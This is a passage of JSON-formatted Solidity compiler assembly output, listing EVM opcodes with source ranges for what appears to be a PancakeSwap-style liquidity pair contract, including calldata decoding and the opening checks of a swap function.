											"end": 18498,
											"name": "DUP1"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "AND"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "PUSH [tag]",
											"value": "117"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH [tag]",
											"value": "119"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH [tag]",
											"value": "121"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "123"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "123"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP3"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "124"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "JUMPDEST"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "DUP1"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "126"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "126"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "AND"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "PUSH [tag]",
											"value": "127"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "129"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "129"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "ADD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "130"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMPDEST"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH [tag]",
											"value": "132"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "JUMPDEST"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "PUSH [tag]",
											"value": "134"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "JUMPDEST"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "136"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "136"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 12120,
											"end": 12134,
											"name": "DUP5"
										},
										{
											"begin": 12120,
											"end": 12134,
											"name": "ISZERO"
										},
										{
											"begin": 12120,
											"end": 12134,
											"name": "ISZERO"
										},
										{
											"begin": 12120,
											"end": 12134,
											"name": "DUP1"
										},
										{
											"begin": 12120,
											"end": 12152,
											"name": "PUSH [tag]",
											"value": "138"
										},
										{
											"begin": 12120,
											"end": 12152,
											"name": "JUMPI"
										},
										{
											"begin": 12120,
											"end": 12152,
											"name": "POP"
										},
										{
											"begin": 12151,
											"end": 12152,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12138,
											"end": 12148,
											"name": "DUP5"
										},
										{
											"begin": 12138,
											"end": 12152,
											"name": "GT"
										},
										{
											"begin": 12120,
											"end": 12152,
											"name": "tag",
											"value": "138"
										},
										{
											"begin": 12120,
											"end": 12152,
											"name": "JUMPDEST"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH [tag]",
											"value": "139"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "JUMPI"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "MSTORE"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "ADD"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP1"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP1"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "ADD"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP3"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SUB"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP3"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "MSTORE"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "MSTORE"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "ADD"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP1"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH data",
											"value": "C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SWAP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "CODECOPY"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "ADD"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SWAP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "POP"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "POP"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "MLOAD"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "DUP1"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SWAP2"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SUB"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "SWAP1"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "REVERT"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "tag",
											"value": "139"
										},
										{
											"begin": 12099,
											"end": 12213,
											"name": "JUMPDEST"
										},
										{
											"begin": 12224,
											"end": 12241,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12243,
											"end": 12260,
											"name": "DUP1"
										},
										{
											"begin": 12266,
											"end": 12279,
											"name": "PUSH [tag]",
											"value": "140"
										},
										{
											"begin": 12266,
											"end": 12277,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 12266,
											"end": 12279,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12266,
											"end": 12279,
											"name": "tag",
											"value": "140"
										},
										{
											"begin": 12266,
											"end": 12279,
											"name": "JUMPDEST"
										},
										{
											"begin": 12223,
											"end": 12279,
											"name": "POP"
										},
										{
											"begin": 12223,
											"end": 12279,
											"name": "SWAP2"
										},
										{
											"begin": 12223,
											"end": 12279,
											"name": "POP"
										},
										{
											"begin": 12223,
											"end": 12279,
											"name": "SWAP2"
										},
										{
											"begin": 12223,
											"end": 12279,
											"name": "POP"
										},
										{
											"begin": 12338,
											"end": 12347,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12325,
											"end": 12347,
											"name": "AND"
										},
										{
											"begin": 12325,
											"end": 12335,
											"name": "DUP8"
										},
										{
											"begin": 12325,
											"end": 12347,
											"name": "LT"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "DUP1"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "ISZERO"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "JUMPI"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "POP"
										},
										{
											"begin": 12364,
											"end": 12373,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12351,
											"end": 12373,
											"name": "AND"
										},
										{
											"begin": 12351,
											"end": 12361,
											"name": "DUP7"
										},
										{
											"begin": 12351,
											"end": 12373,
											"name": "LT"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "tag",
											"value": "141"
										},
										{
											"begin": 12325,
											"end": 12373,
											"name": "JUMPDEST"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "JUMPI"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP1"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP2"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MSTORE"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP3"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "ADD"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MSTORE"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP3"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "ADD"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MSTORE"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "50616E63616B653A20494E53554646494349454E545F4C495155494449545900"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP3"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "ADD"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MSTORE"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "SWAP1"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "MLOAD"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "SWAP1"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "DUP2"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "SWAP1"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "SUB"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "ADD"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "SWAP1"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "REVERT"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "tag",
											"value": "142"
										},
										{
											"begin": 12304,
											"end": 12430,
											"name": "JUMPDEST"
										},
										{
											"begin": 12441,
											"end": 12454,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12464,
											"end": 12477,
											"name": "DUP1"
										},
										{
											"begin": 12501,
											"end": 12519,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12559,
											"end": 12562,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12549,
											"end": 12555,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 12549,
											"end": 12555,
											"name": "SLOAD"
										},
										{
											"begin": 12536,
											"end": 12546,
											"name": "DUP12"
										},
										{
											"begin": 12536,
											"end": 12555,
											"name": "MUL"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "DUP2"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "PUSH [tag]",
											"value": "143"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "JUMPI"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "INVALID"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "tag",
											"value": "143"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "JUMPDEST"
										},
										{
											"begin": 12535,
											"end": 12562,
											"name": "DIV"
										},
										{
											"begin": 12522,
											"end": 12532,
											"name": "DUP11"
										},
										{
											"begin": 12522,
											"end": 12562,
											"name": "SUB"
										},
										{
											"begin": 12501,
											"end": 12562,
											"name": "SWAP1"
										},
										{
											"begin": 12501,
											"end": 12562,
											"name": "POP"
										},
										{
											"begin": 12576,
											"end": 12594,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12634,
											"end": 12637,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12624,
											"end": 12630,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 12624,
											"end": 12630,
											"name": "SLOAD"
										},
										{
											"begin": 12611,
											"end": 12621,
											"name": "DUP12"
										},
										{
											"begin": 12611,
											"end": 12630,
											"name": "MUL"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "DUP2"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "JUMPI"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "INVALID"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "tag",
											"value": "144"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "JUMPDEST"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "SLOAD"
										},
										{
											"begin": 12775,
											"end": 12781,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 12775,
											"end": 12781,
											"name": "SLOAD"
										},
										{
